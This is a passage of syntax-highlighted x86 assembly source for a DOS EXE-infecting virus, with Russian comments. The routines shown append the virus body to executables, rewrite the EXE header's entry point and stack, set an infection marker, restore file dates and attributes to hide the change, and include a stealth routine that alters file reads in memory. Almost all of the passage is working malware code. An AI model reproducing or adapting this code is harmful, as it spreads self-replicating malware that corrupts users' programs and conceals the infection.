        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель в конец файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Записываем код вируса]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем дату и время создания файла]</span><span class="sc0">

</span><span class="sc5">RestTime</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Закрываем файл]</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;Восстанавливаем атрибуты файла]</span><span class="sc0">

</span><span class="sc5">RestAttr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем вектор Int 24h]</span><span class="sc0">

</span><span class="sc5">Fault</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;               ПРОВЕРКА ПРИГОДНОСТИ ФАЙЛА И СОЗДАНИЕ ЗАГОЛОВКА</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">TestFile</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Сохраняем текущую позицию в файле]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CurPos</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CurPos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">


</span><span class="sc1">;[Сохраняем размер файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FSize</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FSize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель в начало файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">


</span><span class="sc1">;[Считываем заголовок EXE-файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель на 3Ch байт от начала файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">


</span><span class="sc1">;[Считываем адрес NewEXE заголовка]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель на NewEXE заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">


</span><span class="sc1">;[Считываем первые два байта NewEXE заголовка]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем текущую позицию в файле]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CurPos</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CurPos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoError</span><span class="sc0">


</span><span class="sc1">;[Выходим из подпрограммы]</span><span class="sc0">

</span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;[Проверяем тип файла и его зараженность]</span><span class="sc0">

</span><span class="sc5">NoError</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">Error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6666h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">


</span><span class="sc1">;[Если NewEXE заголовок присутствует, то выходим]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NewEXE</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CmpStr</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">


</span><span class="sc1">;[Содержит ли файл оверлеи]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFSize</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Into512</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">Error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">Error</span><span class="sc0">


</span><span class="sc1">;[Вычисляем длину файла с вирусом]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Into512</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">


</span><span class="sc1">;[Сохраняем SS, SP, CS, IP]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldSS</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldSP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldCS</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldIP</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Корректируем точку входа и адрес стека]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем признак заражения файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6666h</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                         ЗАРАЖЕНИЕ ФАЙЛА В ПАМЯТИ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc2">.386</span><span class="sc0">

</span><span class="sc5">Exec3F</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CurPos</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FSize</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CurPos</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">A06</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc5">A01</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">A03</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">A04</span><span class="sc0">

</span><span class="sc5">A01</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">A02</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">A07</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">A08</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">A06</span><span class="sc0">

</span><span class="sc5">A02</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CurPos</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">A09</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">A10</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">A12</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">A05</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">A03</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">A04</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetNewPos</span><span class="sc0">
</span><span class="sc5">A05</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Store</span><span class="sc0">
